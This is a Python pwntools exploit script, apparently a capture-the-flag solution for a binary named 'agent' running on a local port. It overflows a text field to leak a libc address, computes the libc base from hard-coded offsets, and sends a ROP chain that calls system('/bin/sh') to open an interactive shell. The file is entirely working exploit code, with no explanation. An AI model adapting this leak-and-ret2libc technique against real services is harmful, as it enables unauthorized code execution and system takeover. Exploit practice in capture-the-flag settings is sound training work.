from pwn import *

elf = ELF("../dist/agent")
libc = ELF('../dist/libc-2.31.so')

io = remote("localhost", 30005)
#io = process("../dist/agent")

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Name > ", b"A"*0x1)
io.sendlineafter(b"Words > ", b"B"*(0xe0 - 3) + b"END")
io.sendlineafter(b"Age > ", b"256")
io.sendlineafter(b"Job > ", b"")

# leak libc addr
io.recvuntil(b"END")
libc_addr = io.recvline()[:-1]
libc_addr = u64(libc_addr + b"\x00" * (8 - len(libc_addr)))
libc_base = libc_addr - 0x1ed6a0
print("libc base is {}".format(hex(libc_base)))

system_addr = libc_base + 0x52290
pop_rdi_ret = libc_base + 0x5422e
pop_rdx_ret = libc_base + 0x142c92
pop_rsi_ret = libc_base + 0x635dc
ret_addr = libc_base + 0xb1475

payload = p64(pop_rdi_ret)
payload += p64(libc_base + next(libc.search(b"/bin/sh")))
#payload += p64(pop_rsi_ret)
#payload += p64(0x0)
#payload += p64(pop_rdx_ret)
#payload += p64(0x0)
payload += p64(ret_addr)
payload += p64(system_addr)

io.sendlineafter(b"> ", b'4')
io.sendlineafter(b"> ", p32(0x0) * 16 + payload)

io.sendlineafter(b"?\n", b"YES")
io.recvuntil(b"!\n")

io.interactive()
